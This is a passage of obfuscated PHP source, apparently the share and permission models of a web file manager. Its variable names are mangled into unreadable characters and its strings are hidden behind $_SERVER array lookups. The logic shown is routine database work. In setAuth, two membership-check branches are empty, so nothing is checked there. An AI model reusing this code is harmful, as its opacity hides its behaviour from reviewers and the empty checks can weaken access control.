!1); } } private function _folderReport($¦ôÉ¯İ) { $ÊºåÈÔÜ =& $_SERVER[¼èá¯æÙ]; $óè°µ»° = array($ÊºåÈÔÜ[552] => array($ÊºåÈÔÜ[1094], 0), $ÊºåÈÔÜ[832] => 3); $Ï®ßà‚º = Model($ÊºåÈÔÜ[2156])->where($óè°µ»°)->field($ÊºåÈÔÜ[552])->select(); if (!$Ï®ßà‚º) { return !1; } $Ï®ßà‚º = array_to_keyvalue($Ï®ßà‚º, $ÊºåÈÔÜ[12], $ÊºåÈÔÜ[552]); $åÍš = $ÊºåÈÔÜ[50] . $¦ôÉ¯İ . $ÊºåÈÔÜ[50]; $óè°µ»° = array($ÊºåÈÔÜ[552] => array($ÊºåÈÔÜ[7], $Ï®ßà‚º), $ÊºåÈÔÜ[595] => array($ÊºåÈÔÜ[470], "\x25{$åÍš}\45"), $ÊºåÈÔÜ[516] => 0); $ñäòÉ = Model($ÊºåÈÔÜ[907])->where($óè°µ»°)->field($ÊºåÈÔÜ[2157])->find(); if (!$ñäòÉ) { return !1; } $ÈÀíŒÛ¾ = substr($ñäòÉ[$ÊºåÈÔÜ[595]], strpos($ñäòÉ[$ÊºåÈÔÜ[595]], $åÍš)); $óè°µ»° = array($ÊºåÈÔÜ[203] => array($ÊºåÈÔÜ[7], trim($ÈÀíŒÛ¾, $ÊºåÈÔÜ[50]))); $ëç¾¦Û = Model($ÊºåÈÔÜ[907])->where($óè°µ»°)->field($ÊºåÈÔÜ[32])->select(); $Èäæ¼¹„ = array_to_keyvalue($ëç¾¦Û, $ÊºåÈÔÜ[12], $ÊºåÈÔÜ[32]); $Èäæ¼¹„[] = $ñäòÉ[$ÊºåÈÔÜ[32]]; return implode($ÊºåÈÔÜ[8], $Èäæ¼¹„); } protected function remove($Ä¥¾¸úŠ) { $î¤ş‚ › =& $_SERVER[¼èá¯æÙ]; $ì¼œ›Ë = is_array($Ä¥¾¸úŠ) ? $Ä¥¾¸úŠ : array($Ä¥¾¸úŠ); for ($è’ƒ¤õö = 0; $è’ƒ¤õö < count($ì¼œ›Ë); $è’ƒ¤õö++) { $ÂİÙªŠó = $this->getInfo($ì¼œ›Ë[$è’ƒ¤õö]); if ($ÂİÙªŠó[$î¤ş‚ ›[677]] == $î¤ş‚ ›[101]) { Model($î¤ş‚ ›[647])->eventShare($ÂİÙªŠó[$î¤ş‚ ›[203]], $î¤ş‚ ›[2144]); } if ($ÂİÙªŠó[$î¤ş‚ ›[573]] == $î¤ş‚ ›[101]) { Model($î¤ş‚ ›[647])->eventShare($ÂİÙªŠó[$î¤ş‚ ›[203]], $î¤ş‚ ›[2143]); } $this->shareInfoMofify($ÂİÙªŠó, $î¤ş‚ ›[2128]); } $’èøÓ†³ = array($î¤ş‚ ›[679] => array($î¤ş‚ ›[7], $ì¼œ›Ë)); $çë¼Ã = $this->where($’èøÓ†³)->delete(); if ($çë¼Ã) { Model($î¤ş‚ ›[680])->where($’èøÓ†³)->delete(); } return $çë¼Ã; } protected function removeBySource($¤ÒçğÇ¹) { $²”Ø°ëé =& $_SERVER[¼èá¯æÙ]; $ã“´¬š¦ = array($²”Ø°ëé[502] => array($²”Ø°ëé[503], $¤ÒçğÇ¹)); $öº¾¬¸Ü = $this->field($²”Ø°ëé[679])->where($ã“´¬š¦)->select(); $¬êğı = array_to_keyvalue($öº¾¬¸Ü, $²”Ø°ëé[12], $²”Ø°ëé[679]); if (!$¬êğı) { return; } foreach ($öº¾¬¸Ü as $´İéêÙË) { $this->shareInfoMofify($´İéêÙË, $²”Ø°ëé[2128]); } $ã“´¬š¦ = array($²”Ø°ëé[2150] => array($²”Ø°ëé[503], $¬êğı)); $this->where($ã“´¬š¦)->delete(); Model($²”Ø°ëé[680])->where($ã“´¬š¦)->delete(); } public function listAll($·•˜ø¦°) { $İ¯è‚Ú» =& $_SERVER[¼èá¯æÙ]; $úÍõ±³‹ = array(); if ($·•˜ø¦°[$İ¯è‚Ú»[1778]]) { $úÍõ±³‹[$İ¯è‚Ú»[1778]] = $·•˜ø¦°[$İ¯è‚Ú»[1778]]; } if ($·•˜ø¦°[$İ¯è‚Ú»[842]]) { $÷ƒ±¶¥¿ = $·•˜ø¦°[$İ¯è‚Ú»[843]] ? $·•˜ø¦°[$İ¯è‚Ú»[843]] : strtotime(date($İ¯è‚Ú»[2158])); $úÍõ±³‹[$İ¯è‚Ú»[243]] = array($İ¯è‚Ú»[420], array($·•˜ø¦°[$İ¯è‚Ú»[842]], $÷ƒ±¶¥¿)); } if ($·•˜ø¦°[$İ¯è‚Ú»[33]]) { $úÍõ±³‹[$·•˜ø¦°[$İ¯è‚Ú»[33]]] = 1; } else { $úÍõ±³‹[] = array($İ¯è‚Ú»[573] => array($İ¯è‚Ú»[1094], 0), $İ¯è‚Ú»[677] => array($İ¯è‚Ú»[1094], 0), $İ¯è‚Ú»[2132] => $İ¯è‚Ú»[2081]); } if ($·•˜ø¦°[$İ¯è‚Ú»[2077]]) { $úÍõ±³‹[] = array($İ¯è‚Ú»[2129] => $·•˜ø¦°[$İ¯è‚Ú»[2077]], $İ¯è‚Ú»[1666] => array($İ¯è‚Ú»[470], "\45{$·•˜ø¦°[$İ¯è‚Ú»[2077]]}\x25"), $İ¯è‚Ú»[2132] => $İ¯è‚Ú»[2081]); } $ëïÎş = $this->_makeOrder()->where($úÍõ±³‹)->selectPage(20); if (empty($ëïÎş[$İ¯è‚Ú»[457]])) { return array(); } $this->_listDataApply($ëïÎş[$İ¯è‚Ú»[457]]); return $ëïÎş; } public function listDataApply($»ãŒ¨û¡) { $this->_listDataApply($»ãŒ¨û¡); return $»ãŒ¨û¡; } private function _listDataApply(&$å áñŸæ) { $¿÷Ö¨å´ =& $_SERVER[¼èá¯æÙ]; $ñè­Ç©­ = array_to_keyvalue($å áñŸæ, $¿÷Ö¨å´[12], $¿÷Ö¨å´[1778]); $¹ùù¤üë = Model($¿÷Ö¨å´[608])->userListInfo(array_unique($ñè­Ç©­)); $¨ªŠâ£ = array_to_keyvalue($å áñŸæ, $¿÷Ö¨å´[12], $¿÷Ö¨å´[203]); $¦”ÍäØ§ = Model($¿÷Ö¨å´[907])->sourceListInfo($¨ªŠâ£, !0); foreach ($å áñŸæ as $äÃ¹š¬ => &$—ñºâÚ¬) { $Ä«·šÜÊ = $—ñºâÚ¬[$¿÷Ö¨å´[1778]]; $—ñºâÚ¬[$¿÷Ö¨å´[2159]] = $¹ùù¤üë[$Ä«·šÜÊ] ? $¹ùù¤üë[$Ä«·šÜÊ] : !1; if (!$—ñºâÚ¬[$¿÷Ö¨å´[2159]] || $—ñºâÚ¬[$¿÷Ö¨å´[2159]][$¿÷Ö¨å´[832]] != $¿÷Ö¨å´[101]) { unset($å áñŸæ[$äÃ¹š¬]); continue; } $ä–“Ï = $—ñºâÚ¬[$¿÷Ö¨å´[203]]; $—ñºâÚ¬[$¿÷Ö¨å´[100]] = $¦”ÍäØ§[$ä–“Ï] ? $¦”ÍäØ§[$ä–“Ï] : !1; if ($—ñºâÚ¬[$¿÷Ö¨å´[100]][$¿÷Ö¨å´[516]] == $¿÷Ö¨å´[101]) { unset($å áñŸæ[$äÃ¹š¬]); } if ($—ñºâÚ¬[$¿÷Ö¨å´[100]] != $¿÷Ö¨å´[240] && !$—ñºâÚ¬[$¿÷Ö¨å´[100]]) { unset($å áñŸæ[$äÃ¹š¬]); } } unset($—ñºâÚ¬); $å áñŸæ = array_values($å áñŸæ); } private function _makeOrder($Úµ‘àÚ¦ = '') { $È¥ ÖÖø =& $_SERVER[¼èá¯æÙ]; $Íºú™ó = array($È¥ ÖÖø[243], $È¥ ÖÖø[843], $È¥ ÖÖø[2146], $È¥ ÖÖø[2147]); $—ìæ‚ = array($È¥ ÖÖø[534] => $È¥ ÖÖø[535], $È¥ ÖÖø[536] => $È¥ ÖÖø[537]); $ñÉÆ—ı = Input::get($È¥ ÖÖø[541], $È¥ ÖÖø[7], $È¥ ÖÖø[508], $Íºú™ó); $‹İìç’„ = Input::get($È¥ ÖÖø[542], $È¥ ÖÖø[7], $È¥ ÖÖø[2160], array($È¥ ÖÖø[2074], $È¥ ÖÖø[536])); $‹İìç’„ = $—ìæ‚[$‹İìç’„]; $Úµ‘àÚ¦ = $Úµ‘àÚ¦ . "{$ñÉÆ—ı}\40{$‹İìç’„}"; return $this->order($Úµ‘àÚ¦); } public function reportAdd($Ï¦ÑŞ«Å) { $¢Â´×€ú =& $_SERVER[¼èá¯æÙ]; $ÏõœÚñŸ = array($¢Â´×€ú[679] => $Ï¦ÑŞ«Å[$¢Â´×€ú[679]], $¢Â´×€ú[1778] => USER_ID); if (Model($¢Â´×€ú[2156])->where($ÏõœÚñŸ)->find()) { return !1; } $íëöæğ = array($¢Â´×€ú[679] => $Ï¦ÑŞ«Å[$¢Â´×€ú[679]], $¢Â´×€ú[1666] => $Ï¦ÑŞ«Å[$¢Â´×€ú[1666]], $¢Â´×€ú[203] => $Ï¦ÑŞ«Å[$¢Â´×€ú[203]], $¢Â´×€ú[552] => $Ï¦ÑŞ«Å[$¢Â´×€ú[552]], $¢Â´×€ú[1778] => USER_ID, $¢Â´×€ú[33] => $Ï¦ÑŞ«Å[$¢Â´×€ú[33]], $¢Â´×€ú[537] => $Ï¦ÑŞ«Å[$¢Â´×€ú[537]]); return Model($¢Â´×€ú[2156])->add($íëöæğ); } public function reportList($µ³Í¨) { $­ËÙáÏş =& $_SERVER[¼èá¯æÙ]; $êƒ¥Ñø˜ = array(); if ($µ³Í¨[$­ËÙáÏş[842]]) { $Ô‚Áä… = $µ³Í¨[$­ËÙáÏş[843]] ? $µ³Í¨[$­ËÙáÏş[843]] : strtotime(date($­ËÙáÏş[2158])); $êƒ¥Ñø˜[$­ËÙáÏş[243]] = array($­ËÙáÏş[420], array($µ³Í¨[$­ËÙáÏş[842]], $Ô‚Áä…)); } if (isset($µ³Í¨[$­ËÙáÏş[33]]) && in_array($µ³Í¨[$­ËÙáÏş[33]], array($­ËÙáÏş[101], $­ËÙáÏş[521], $­ËÙáÏş[2161], $­ËÙáÏş[2162], $­ËÙáÏş[2163]))) { $êƒ¥Ñø˜[$­ËÙáÏş[33]] = $µ³Í¨[$­ËÙáÏş[33]]; } if (isset($µ³Í¨[$­ËÙáÏş[832]]) && in_array($µ³Í¨[$­ËÙáÏş[832]], array($­ËÙáÏş[240], $­ËÙáÏş[101], $­ËÙáÏş[521], $­ËÙáÏş[2161]))) { $êƒ¥Ñø˜[$­ËÙáÏş[832]] = $µ³Í¨[$­ËÙáÏş[832]]; } $…Ú¥œä = Input::get($­ËÙáÏş[542], $­ËÙáÏş[7], $­ËÙáÏş[2160], array($­ËÙáÏş[2074], $­ËÙáÏş[536])); $ÕÙ†ª = array($­ËÙáÏş[534] => $­ËÙáÏş[535], $­ËÙáÏş[536] => $­ËÙáÏş[537]); $áÍÈÌˆ = $­ËÙáÏş[2164] . $ÕÙ†ª[$…Ú¥œä]; $òŠ›Ú©î = Model($­ËÙáÏş[2156])->where($êƒ¥Ñø˜)->order($áÍÈÌˆ)->selectPage(20); if (empty($òŠ›Ú©î[$­ËÙáÏş[457]])) { return array(); } $Œª•§‹ = array_to_keyvalue_group($òŠ›Ú©î[$­ËÙáÏş[457]], $­ËÙáÏş[832], $­ËÙáÏş[679]); if (!empty($Œª•§‹[0])) { $µ³Í¨ = $Œª•§‹[0]; $êƒ¥Ñø˜ = array($­ËÙáÏş[679] => array($­ËÙáÏş[7], $µ³Í¨)); $Ù•Ì©–› = $this->where($êƒ¥Ñø˜)->field($­ËÙáÏş[679])->select(); $Ù•Ì©–› = array_to_keyvalue($Ù•Ì©–›, $­ËÙáÏş[12], $­ËÙáÏş[679]); $Ä“Å¯¶ä = array_diff($µ³Í¨, $Ù•Ì©–›); if (!empty($Ä“Å¯¶ä)) { foreach ($òŠ›Ú©î[$­ËÙáÏş[457]] as $Õ ‘“¿ => $Ê¦²‚¶Ó) { if (in_array($Ê¦²‚¶Ó[$­ËÙáÏş[679]], $Ä“Å¯¶ä)) { unset($òŠ›Ú©î[$­ËÙáÏş[457]][$Õ ‘“¿]); } } } } $this->_listDataApply($òŠ›Ú©î[$­ËÙáÏş[457]]); return $òŠ›Ú©î; } public function reportStatus($·Œâéå) { $›—ÙÇáÃ =& $_SERVER[¼èá¯æÙ]; $— Í¤½© = array($›—ÙÇáÃ[486] => $·Œâéå[$›—ÙÇáÃ[486]]); $İ–±€Ö = Model($›—ÙÇáÃ[2156])->where($— Í¤½©)->field($›—ÙÇáÃ[2165])->find(); if (!$İ–±€Ö) { return !1; } $ÛˆÔş¯Ú = array($›—ÙÇáÃ[832] => $·Œâéå[$›—ÙÇáÃ[832]]); if ($·Œâéå[$›—ÙÇáÃ[832]] == $›—ÙÇáÃ[2161] && $İ–±€Ö[$›—ÙÇáÃ[832]] == $›—ÙÇáÃ[2161]) { $ÛˆÔş¯Ú[$›—ÙÇáÃ[832]] = 0; } $Î½­ÔÓ = Model($›—ÙÇáÃ[2156])->where($— Í¤½©)->save($ÛˆÔş¯Ú); if ($·Œâéå[$›—ÙÇáÃ[832]] == $›—ÙÇáÃ[521]) { if ($İ–±€Ö[$›—ÙÇáÃ[552]] != $›—ÙÇáÃ[240] && $this->shareFileMeta($İ–±€Ö[$›—ÙÇáÃ[552]])) { $this->shareFileMeta($İ–±€Ö[$›—ÙÇáÃ[552]], 0); } $this->remove($İ–±€Ö[$›—ÙÇáÃ[679]]); return !0; } if ($Î½­ÔÓ && $·Œâéå[$›—ÙÇáÃ[832]] == $›—ÙÇáÃ[2161]) { $ª¨åÖôª = $ÛˆÔş¯Ú[$›—ÙÇáÃ[832]] == $›—ÙÇáÃ[2161] ? 1 : 0; $this->shareFileMeta($İ–±€Ö[$›—ÙÇáÃ[552]], $ª¨åÖôª); $this->removeByFile($İ–±€Ö[$›—ÙÇáÃ[552]]); } return $Î½­ÔÓ; } private function removeByFile($ËşÍ¦É‘) { $ş³œ¿¹‘ =& $_SERVER[¼èá¯æÙ]; $éÅºòá = Model($ş³œ¿¹‘[907])->where(array($ş³œ¿¹‘[552] => $ËşÍ¦É‘))->field($ş³œ¿¹‘[203])->select(); $‰‰®¶Òä = array_to_keyvalue($éÅºòá, $ş³œ¿¹‘[12], $ş³œ¿¹‘[203]); $²¼ÅˆŸ„ = array($ş³œ¿¹‘[203] => array($ş³œ¿¹‘[7], $‰‰®¶Òä), $ş³œ¿¹‘[573] => 1); $éÅºòá = $this->where($²¼ÅˆŸ„)->field($ş³œ¿¹‘[679])->select(); if (empty($éÅºòá)) { return; } $î±‹¶Ö = array_to_keyvalue($éÅºòá, $ş³œ¿¹‘[12], $ş³œ¿¹‘[679]); $this->remove($î±‹¶Ö); } private function shareFileMeta($®Ğú’·Ò, $íŒËŠÏ¹ = null) { $˜ŞÚôë¥ =& $_SERVER[¼èá¯æÙ]; $¯ò¡€í¶ = array($˜ŞÚôë¥[552] => $®Ğú’·Ò, $˜ŞÚôë¥[107] => $˜ŞÚôë¥[2166]); if (is_null($íŒËŠÏ¹)) { return Model($˜ŞÚôë¥[2167])->where($¯ò¡€í¶)->find(); } $¯ò¡€í¶[$˜ŞÚôë¥[462]] = $íŒËŠÏ¹; Model($˜ŞÚôë¥[2167])->add($¯ò¡€í¶, array(), !0); } } class SourceAuthModel extends ModelBase { protected $tableName = "\151\157\x5f\x73\157\x75\x72\143\x65\x5f\141\165\x74\150"; public function getAuth($˜èØÏ™¬) { $¸¾Šïˆ =& $_SERVER[¼èá¯æÙ]; $ûº§»éÑ = $this->sourceAuthSelect($˜èØÏ™¬); $šğ“ÎÑâ = array(); $˜¬—À = array(); $²‚’š˜ = 2 << 25; foreach ($ûº§»éÑ as $ –·ÖŸõ) { $ºëÙ³øÈ = Model($¸¾Šïˆ[582])->listData($ –·ÖŸõ[$¸¾Šïˆ[2087]]); if (!$ºëÙ³øÈ) { continue; } $šğ“ÎÑâ[] = $ –·ÖŸõ; $«à¡ïÈ• = 0; if ($ –·ÖŸõ[$¸¾Šïˆ[200]] == SourceModel::TYPE_GROUP) { $«à¡ïÈ• = $²‚’š˜ * 2; } if ($ –·ÖŸõ[$¸¾Šïˆ[200]] == SourceModel::TYPE_USER) { $«à¡ïÈ• = $²‚’š˜; } if ($ –·ÖŸõ[$¸¾Šïˆ[200]] == SourceModel::TYPE_USER && $ –·ÖŸõ[$¸¾Šïˆ[580]] == $¸¾Šïˆ[240]) { $«à¡ïÈ• = 0; } $˜¬—À[] = $ºëÙ³øÈ[$¸¾Šïˆ[498]] + $«à¡ïÈ•; } array_multisort($˜¬—À, SORT_DESC, $šğ“ÎÑâ); return $šğ“ÎÑâ; } public function sourceAuthSelect($Ò¤é€Ó“) { $“…‚ØŠ =& $_SERVER[¼èá¯æÙ]; static $ŞãÑ¦ÒÏ = array(); $Ô‡ù¦ÆÜ = is_array($Ò¤é€Ó“) ? !1 : !0; if ($Ô‡ù¦ÆÜ) { $Ò¤é€Ó“ = array($Ò¤é€Ó“); } $óá—í = array(); foreach ($Ò¤é€Ó“ as $»ì¸×İº) { if (isset($ŞãÑ¦ÒÏ[$»ì¸×İº])) { $óá—í[$»ì¸×İº] = $ŞãÑ¦ÒÏ[$»ì¸×İº]; } } if (count($óá—í) == count($Ò¤é€Ó“)) { return $Ô‡ù¦ÆÜ ? $óá—í[$Ò¤é€Ó“[0]] : $óá—í; } $Ôğä = $“…‚ØŠ[2168]; $¦„½ÑŒ¼ = array($“…‚ØŠ[203] => array($“…‚ØŠ[7], $Ò¤é€Ó“)); $±¾¶¹™ = $this->field($Ôğä)->order($“…‚ØŠ[486])->where($¦„½ÑŒ¼)->select(); $óß‡óİ” = array_to_keyvalue_group($±¾¶¹™, $“…‚ØŠ[203]); foreach ($Ò¤é€Ó“ as $»ì¸×İº) { $ŞãÑ¦ÒÏ[$»ì¸×İº] = $óß‡óİ”[$»ì¸×İº] ? $óß‡óİ”[$»ì¸×İº] : array(); } if ($Ô‡ù¦ÆÜ) { return $±¾¶¹™; } return $óß‡óİ”; } public function setAuth($´¾†¤Å‹, $íİÜ«Á) { $ï¢Ø”§Û =& $_SERVER[¼èá¯æÙ]; $š–öÎ¢Æ = Model($ï¢Ø”§Û[1426])->sourceInfo($´¾†¤Å‹); if (!$š–öÎ¢Æ) { return !1; } if ($š–öÎ¢Æ[$ï¢Ø”§Û[200]] != SourceModel::TYPE_GROUP) { return !1; } $ëöÛ¸Ÿ = 1; $€ŞŒÎ½ = $š–öÎ¢Æ[$ï¢Ø”§Û[580]]; if ($€ŞŒÎ½ != $ëöÛ¸Ÿ) { $Šì½Ï‡ = array($ï¢Ø”§Û[1979] => $€ŞŒÎ½); $•‘Ãğ•‚ = Model($ï¢Ø”§Û[2073])->field($ï¢Ø”§Û[1778])->where($Šì½Ï‡)->select(); $•‘Ãğ•‚ = array_to_keyvalue($•‘Ãğ•‚, $ï¢Ø”§Û[12], $ï¢Ø”§Û[1778]); } $¸´íÃ…÷ = array(SourceModel::TYPE_GROUP, SourceModel::TYPE_USER); $¬„ÎŠ¹í = array(); foreach ($íİÜ«Á as $…×şêê ) { if (!in_array($…×şêê [$ï¢Ø”§Û[200]], $¸´íÃ…÷)) { show_json(LNG($ï¢Ø”§Û[2169]), !1); } if ($€ŞŒÎ½ != $ëöÛ¸Ÿ) { if ($…×şêê [$ï¢Ø”§Û[200]] == SourceModel::TYPE_GROUP) { } if ($…×şêê [$ï¢Ø”§Û[580]] != 0 && !in_array($…×şêê [$ï¢Ø”§Û[580]], $•‘Ãğ•‚)) { } } if ($…×şêê [$ï¢Ø”§Û[580]] == 0) { $…×şêê [$ï¢Ø”§Û[200]] = SourceModel::TYPE_USER; } $¬„ÎŠ¹í[] = array($ï¢Ø”§Û[203] => $´¾†¤Å‹, $ï¢Ø”§Û[200] => intval($…×şêê [$ï¢Ø”§Û[200]]), $ï¢Ø”§Û[580] => intval($…×şêê [$ï¢Ø”§Û[580]]), $ï¢Ø”§Û[2087] => intval($…×şêê [$ï¢Ø”§Û[2087]]) ? intval($…×şêê [$ï¢Ø”§Û[2087]]) : 0, $ï¢Ø”§Û[2151] => intval($…×şêê [$ï¢Ø”§Û[2151]]) ? intval($…×şêê [$ï¢Ø”§Û[2151]]) : -1); } $this->where(array($ï¢Ø”§Û[502] => $´¾†¤Å‹))->delete(); $this->addAll($¬„ÎŠ¹í); return !0; } public function authClear($¬©¶¬Ã¨) { $ò‰áëÃ± =& $_SERVER[¼èá¯æÙ]; $‚üŒ‘ˆ¯ = Model($ò‰áëÃ±[1426])->sourceInfo($¬©¶¬Ã¨); $µÑ·® = array($¬©¶¬Ã¨); if ($‚üŒ‘ˆ¯[$ò‰áëÃ±[496]] == $ò‰áëÃ±[101]) { $àÂĞÀ¸ü = array($ò‰áëÃ±[666] => array($ò‰áëÃ±[626], $‚üŒ‘ˆ¯[$ò‰áëÃ±[595]] . $¬©¶¬Ã¨ . $ò‰áëÃ±[627])); $µÑ·® = Model($ò‰áëÃ±[1426])->field($ò‰áëÃ±[502])->where($àÂĞÀ¸ü)->getField($ò‰áëÃ±[203], !0); $µÑ·®[] = $¬©¶¬Ã¨; } $this->where(array($ò‰áëÃ±[502] => array($ò‰áëÃ±[503], $µÑ·®)))->delete(); return !0; } public function getAllChildren($šô³öè) { $ŸÍíÆ­ =& $_SERVER[¼èá¯æÙ]; $Ü©É¶Şò = Model($ŸÍíÆ­[1426])->sourceInfo($šô³öè); if ($Ü©É¶Şò[$ŸÍíÆ­[496]] != $ŸÍíÆ­[101]) { return $this->sourceListAuth(array($šô³öè)); } if ($Ü©É¶Şò[$ŸÍíÆ­[200]] != SourceModel::TYPE_GROUP) { return array(); } $ë‡¬–ŸÏ = 1; $…ñ¤×­© = array($šô³öè); if ($Ü©É¶Şò[$ŸÍíÆ­[202]] == $ŸÍíÆ­[240] && $Ü©É¶Şò[$ŸÍíÆ­[580]] != $ë‡¬–ŸÏ) { $…ñ¤×­© = $this->groupChidldAllRootSource($Ü©É¶Şò[$ŸÍíÆ­[580]]); } $ê‡âò½Ó = $this->field($ŸÍíÆ­[203])->group($ŸÍíÆ­[203])->select(); $ê‡âò½Ó = array_to_keyvalue($ê‡âò½Ó, $ŸÍíÆ­[12], $ŸÍíÆ­[203]); if (!$ê‡âò½Ó) { return array(); } $Ï¹……¬¦ = $ŸÍíÆ­[2170]; $ş™¢²Êø = array($ŸÍíÆ­[203] => array($ŸÍíÆ­[7], $ê‡âò½Ó), $ŸÍíÆ­[516] => $ŸÍíÆ­[240]); $ˆåÓš¬Ñ = Model($ŸÍíÆ­[907])->field($Ï¹……¬¦)->where($ş™¢²Êø)->select(); $Ğš¸¨” = array($šô³öè); foreach ($ˆåÓš¬Ñ as $¯²©µË…) { foreach ($…ñ¤×­© as $òşğœ’) { $ğûœË¡ = $ŸÍíÆ­[50] . $òşğœ’ . $ŸÍíÆ­[50]; $ıÊı·£± = $¯²©µË…[$ŸÍíÆ­[595]] . $¯²©µË…[$ŸÍíÆ­[203]] . $ŸÍíÆ­[50]; if (strstr($ıÊı·£±, $ğûœË¡)) { $Ğš¸¨”[] = $¯²©µË…[$ŸÍíÆ­[203]]; break; } } } return $this->sourceListAuth($Ğš¸¨”); } private function sourceListAuth($’´¾‹ïé) { $—éï¹¨ =& $_SERVER[¼èá¯æÙ]; $ÑáÑ¨î = Model($—éï¹¨[1426])->sourceListInfo($’´¾‹ïé, !0); $÷™ÒÑÉ¥ = $this->sourceAuthSelect($’´¾‹ïé); $™‘™û“™ = array(); $¨åÈã¤Ã = array(); foreach ($ÑáÑ¨î as $¦óÉ™ùÈ) { unset($¦óÉ™ùÈ[$—éï¹¨[540]]); unset($¦óÉ™ùÈ[$—éï¹¨[538]]); unset($¦óÉ™ùÈ[$—éï¹¨[498]]); unset($¦óÉ™ùÈ[$—éï¹¨[100]]); $ÏíîğÜ = $÷™ÒÑÉ¥[$¦óÉ™ùÈ[$—éï¹¨[203]]]; if (!$ÏíîğÜ) { continue; } $¦óÉ™ùÈ[$—éï¹¨[2171]] = $this->authTargetInfo($ÏíîğÜ); $¦óÉ™ùÈ[$—éï¹¨[593]] = rtrim($¦óÉ™ùÈ[$—éï¹¨[599]], $—éï¹¨[8]) . $—éï¹¨[8] . ltrim($¦óÉ™ùÈ[$—éï¹¨[593]], $—éï¹¨[8]); $™‘™û“™[] = $¦óÉ™ùÈ; $­§¥ø¿÷ = count(explode($—éï¹¨[8], trim($¦óÉ™ùÈ[$—éï¹¨[593]], $—éï¹¨[8]))); $¨åÈã¤Ã[] = $­§¥ø¿÷ + ($¦óÉ™ùÈ[$—éï¹¨[33]] == $—éï¹¨[88] ? 0 : 1000); } array_multisort($¨åÈã¤Ã, SORT_ASC, $™‘™û“™); return $™‘™û“™; } private function groupChidldAllRootSource($Şç÷õû±) { $÷é­Ñ…ë =& $_SERVER[¼èá¯æÙ]; $ìÔÈƒŒ© = Model($÷é­Ñ…ë[2172])->groupChildrenAll($Şç÷õû±); $•ôª°÷± = array($÷é­Ñ…ë[202] => 0, $÷é­Ñ…ë[580] => array($÷é­Ñ…ë[7], $ìÔÈƒŒ©), $÷é­Ñ…ë[200] => SourceModel::TYPE_GROUP); $î¢´¬­ = Model($÷é­Ñ…ë[907])->field($÷é­Ñ…ë[203])->where($•ôª°÷±)->select(); $î¢´¬­ = array_to_keyvalue($î¢´¬­, $÷é­Ñ…ë[12], $÷é­Ñ…ë[203]); return $î¢´¬­; } private function authTargetInfo($Ø¾Ç—ô÷) { $ÇÉÙÌï¥ =& $_SERVER[¼èá¯æÙ]; $ğÙÀ¬ìå = array(); $ÜÍª’«ó = array(); $”Õ—öüË = 2 << 25; foreach ($Ø¾Ç—ô÷ as $÷ê¸„ï) { $µÒ…Å¼· = Model($ÇÉÙÌï¥[582])->listData($÷ê¸„ï[$ÇÉÙÌï¥[2087]]); if (!$µÒ…Å¼·) { continue; } if ($÷ê¸„ï[$ÇÉÙÌï¥[200]] == SourceModel::TYPE_USER) { $˜Ø–Ô§š = Model($ÇÉÙÌï¥[588])->getInfoSimpleOuter($÷ê¸„ï[$ÇÉÙÌï¥[580]]); if ($˜Ø–Ô§š[$ÇÉÙÌï¥[1778]] == $ÇÉÙÌï¥[1278]) { continue; } if ($˜Ø–Ô§š[$ÇÉÙÌï¥[1778]] == $ÇÉÙÌï¥[240]) { $˜Ø–Ô§š[$ÇÉÙÌï¥[32]] = LNG($ÇÉÙÌï¥[2173]); } } else { $˜Ø–Ô§š = Model($ÇÉÙÌï¥[596])->getInfoSimple($÷ê¸„ï[$ÇÉÙÌï¥[580]]); } if (!$˜Ø–Ô§š) { continue; } $˜Ø–Ô§š[$ÇÉÙÌï¥[551]] = $µÒ…Å¼·; $ğÙÀ¬ìå[] = $˜Ø–Ô§š; $”Å›Â®¯ = 0; if ($÷ê¸„ï[$ÇÉÙÌï¥[200]] == SourceModel::TYPE_GROUP) { $”Å›Â®¯ = $”Õ—öüË * 2; } if ($÷ê¸„ï[$ÇÉÙÌï¥[200]] == SourceModel::TYPE_USER) { $”Å›Â®¯ = $”Õ—öüË; } if ($÷ê¸„ï[$ÇÉÙÌï¥[200]] == SourceModel::TYPE_USER && $÷ê¸„ï[$ÇÉÙÌï¥[580]] == $ÇÉÙÌï¥[240]) { $”Å›Â®¯ = 0; } $ÜÍª’«ó[] = $µÒ…Å¼·[$ÇÉÙÌï¥[498]] + $”Å›Â®¯; } array_multisort($ÜÍª’«ó, SORT_DESC, $ğÙÀ¬ìå); return $ğÙÀ¬ìå; } public function getAllChildrenByUser($Ëá†éÉÅ, $ÄÏ®ìÍ¤) { $Ñ•€ıÆ« =& $_SERVER[¼èá¯æÙ]; $´ŠÌùß = Model($Ñ•€ıÆ«[608])->getInfo($ÄÏ®ìÍ¤); if (!$ÄÏ®ìÍ¤ || !$Ëá†éÉÅ || !$´ŠÌùß) { return array(); } $ŸÒñè˜Í = Model($Ñ•€ıÆ«[1426])->sourceInfo($Ëá†éÉÅ); $¶›§‰¡¹ = array(); $ü‚¼æí˜ = 1; if ($ŸÒñè˜Í[$Ñ•€ıÆ«[202]] == $Ñ•€ıÆ«[240] && $ŸÒñè˜Í[$Ñ•€ıÆ«[580]] != $ü‚¼æí˜ && $this->groupContainUser($ŸÒñè˜Í[$Ñ•€ıÆ«[580]], $ÄÏ®ìÍ¤)) { foreach ($´ŠÌùß[$Ñ•€ıÆ«[2174]] as $ºø¾±–) { $¤ø¤åÊ = Model($Ñ•€ıÆ«[596])->getInfo($ºø¾±–[$Ñ•€ıÆ«[1979]]); $ùˆ¬Ó‘ = Model($Ñ•€ıÆ«[608])->getInfoSimpleOuter($ÄÏ®ìÍ¤); $ùˆ¬Ó‘[$Ñ•€ıÆ«[551]] = $ºø¾±–[$Ñ•€ıÆ«[498]]; if (Model($Ñ•€ıÆ«[582])->authCheckAction($ºø¾±–[$Ñ•€ıÆ«[498]][$Ñ•€ıÆ«[498]], $Ñ•€ıÆ«[2000])) { continue; } $ûÅ«ÌíÙ = array($Ñ•€ıÆ«[32] => $Ñ•€ıÆ«[1298] . $¤ø¤åÊ[$Ñ•€ıÆ«[32]], $Ñ•€ıÆ«[203] => $¤ø¤åÊ[$Ñ•€ıÆ«[100]][$Ñ•€ıÆ«[203]], $Ñ•€ıÆ«[97] => KodIO::make($¤ø¤åÊ[$Ñ•€ıÆ«[100]][$Ñ•€ıÆ«[203]]), $Ñ•€ıÆ«[202] => $Ñ•€ıÆ«[240], $Ñ•€ıÆ«[200] => $Ñ•€ıÆ«[589], $Ñ•€ıÆ«[33] => $Ñ•€ıÆ«[630], $Ñ•€ıÆ«[593] => $¤ø¤åÊ[$Ñ•€ıÆ«[600]], $Ñ•€ıÆ«[1979] => 